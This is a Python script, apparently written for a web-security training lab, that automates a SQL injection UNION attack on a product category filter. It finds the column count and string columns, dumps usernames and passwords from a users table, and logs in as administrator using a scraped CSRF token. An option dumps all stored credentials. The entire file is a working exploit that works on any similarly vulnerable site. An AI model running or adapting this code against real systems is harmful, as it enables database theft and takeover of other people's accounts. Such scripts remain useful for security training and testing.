#!/usr/bin/python3

import requests
import sys
import urllib3
import argparse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_column_number(url, proxies=None):
    path="/filter?category=Tech+gifts"
    print(f"[*] Finding number of columns...")
    for i in range(1, 50):
        sql_payload = "' ORDER BY %s--" % i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            print(f"[V] Number of columns is: {i-1}")
            return i-1
    return False

def exploit_sqli_string_field(url, num_columns, proxies=None):
    path="/filter?category=Tech+gifts"
    print(f"[*] Finding string field...")
    
    # Coba payload dengan NULL values
    null_payload = "' UNION SELECT " + "NULL," * (num_columns-1) + "NULL--"
    r = requests.get(url + path + null_payload, verify=False, proxies=proxies)
    
    if "Internal Server Error" not in r.text:
        print(f"[V] Found valid UNION SELECT with {num_columns} columns")
        
        # Test each column for string compatibility
        for i in range(1, num_columns + 1):
            # Build payload with string test in each position
            select_parts = []
            for j in range(1, num_columns + 1):
                if j == i:
                    select_parts.append("'TEST'")
                else:
                    select_parts.append("NULL")
            
            payload = "' UNION SELECT " + ",".join(select_parts) + "--"
            r = requests.get(url + path + payload, verify=False, proxies=proxies)
            
            if "Internal Server Error" not in r.text:
                print(f"[V] Column {i} can hold string data")
                return i  # Return first string column found
    
    print(f"[X] Could not find string field")
    return False

def exploit_sqli_users_table(url, proxies=None):
    path="/filter?category=Tech+gifts"
    
    # Step 1: Find number of columns
    num_columns = exploit_sqli_column_number(url, proxies)
    if not num_columns:
        print(f"[X] Could not determine number of columns")
        return None
    
    # Step 2: Find string field
    string_column = exploit_sqli_string_field(url, num_columns, proxies)
    if not string_column:
        # If we can't find specific string column, try all columns as string
        print(f"[*] Trying with all columns as string...")
    
    # Step 3: Retrieve username and password
    print(f"[*] Dumping username and password from users table...")
    
    # Build payload based on number of columns
    if num_columns == 2:
        # Jika ada 2 kolom, gunakan username dan password langsung
        sqli_payload = "' UNION SELECT username, password FROM users--"
        print(f"[*] Using payload: {sqli_payload}")
    else:
        # Jika lebih dari 2 kolom, isi kolom lain dengan NULL
        select_parts = []
        for i in range(1, num_columns + 1):
            if i == 1:
                select_parts.append("username")
            elif i == 2:
                select_parts.append("password")
            else:
                select_parts.append("NULL")
        
        sqli_payload = "' UNION SELECT " + ",".join(select_parts) + " FROM users--"
        print(f"[*] Using payload: {sqli_payload}")
    
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    
    if 'administrator' in r.text.lower():
        print(f"[V] Found administrator credentials in response")
        
        # Parse the HTML to extract credentials
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Look for table rows that might contain the credentials
        tables = soup.find_all('table')
        for table in tables:
            rows = table.find_all('tr')
            for row in rows:
                cells = row.find_all('td')
                if len(cells) >= 2:
                    username = cells[0].get_text(strip=True)
                    password = cells[1].get_text(strip=True)
                    print(f"[V] Found: {username} - {password}")
                    if username.lower() == 'administrator':
                        print(f"[V] Administrator password is: {password}")
                        return password
        
        # Alternative: look for any text containing 'administrator'
        for element in soup.find_all(string=True):
            if 'administrator' in element.lower():
                # Try to find password in nearby elements
                parent = element.parent
                siblings = parent.find_next_siblings()
                for sibling in siblings:
                    if sibling.get_text(strip=True):
                        print(f"[V] Possible administrator password: {sibling.get_text(strip=True)}")
                        return sibling.get_text(strip=True)
    
    # Show raw response for debugging
    print(f"[*] Response preview (first 500 chars):")
    print(r.text[:500])
    
    print(f"[X] Could not find administrator password in response")
    return None

def dump_all_users(url, proxies=None):
    """Function to dump all users from the database"""
    path="/filter?category=Tech+gifts"
    
    # Find number of columns
    num_columns = exploit_sqli_column_number(url, proxies)
    if not num_columns:
        return None
    
    print(f"[*] Dumping all users and passwords...")
    
    # Build payload to get all users
    if num_columns == 2:
        sqli_payload = "' UNION SELECT username, password FROM users--"
    else:
        select_parts = []
        for i in range(1, num_columns + 1):
            if i == 1:
                select_parts.append("username")
            elif i == 2:
                select_parts.append("password")
            else:
                select_parts.append("NULL")
        sqli_payload = "' UNION SELECT " + ",".join(select_parts) + " FROM users--"
    
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    
    # Parse and display all credentials
    soup = BeautifulSoup(r.text, 'html.parser')
    credentials = []
    
    # Look for table data
    tables = soup.find_all('table')
    for table in tables:
        rows = table.find_all('tr')
        for row in rows:
            cells = row.find_all('td')
            if len(cells) >= 2:
                username = cells[0].get_text(strip=True)
                password = cells[1].get_text(strip=True)
                credentials.append((username, password))
                print(f"[+] {username}:{password}")
    
    return credentials

def get_csrf_token(sess, url, proxies=None):
    path_login = "/login"
    r = sess.get(url + path_login, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {"name": "csrf"})
    if csrf_input:
        csrf = csrf_input.get("value", "")
        print(f"[*] Retrieved CSRF Token: {csrf}")
        return csrf
    else:
        print(f"[X] Could not find CSRF token")
        return None

def login_as_administrator(sess, url, admin_password, proxies=None):
    csrf = get_csrf_token(sess, url, proxies)
    if not csrf:
        return False
    
    path_login = "/login"
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": admin_password
    }
    
    r = sess.post(url + path_login, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text or "logout" in r.text.lower():
        print(f"[V] Successfully logged in as administrator")
        return True
    else:
        print(f"[X] Failed to login as administrator")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL injection UNION attack, retrieving data from other tables")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example/path)", required=True)
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("--dump-all", help="Dump all users from database", action="store_true")
    
    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using Proxy: {args.proxy}")

    if args.dump_all:
        # Dump all users
        credentials = dump_all_users(args.url.strip(), proxies)
        if credentials:
            print(f"[V] Successfully dumped {len(credentials)} user credentials")
        else:
            print(f"[X] Failed to dump user credentials")
    else:
        # Original functionality - get admin password and login
        print(f"[*] Starting SQL injection attack...")
        admin_password = exploit_sqli_users_table(args.url.strip(), proxies)
        
        if not admin_password:
            print(f"[X] Did not find administrator password")
            sys.exit(1)

        print(f"[*] Attempting to login as administrator...")
        sess = requests.Session()
        if login_as_administrator(sess, args.url.strip(), admin_password, proxies):
            print(f"[V] Successfully accessed Administrator's Page")
        else:
            print(f"[X] Failed to access Administrator's Page")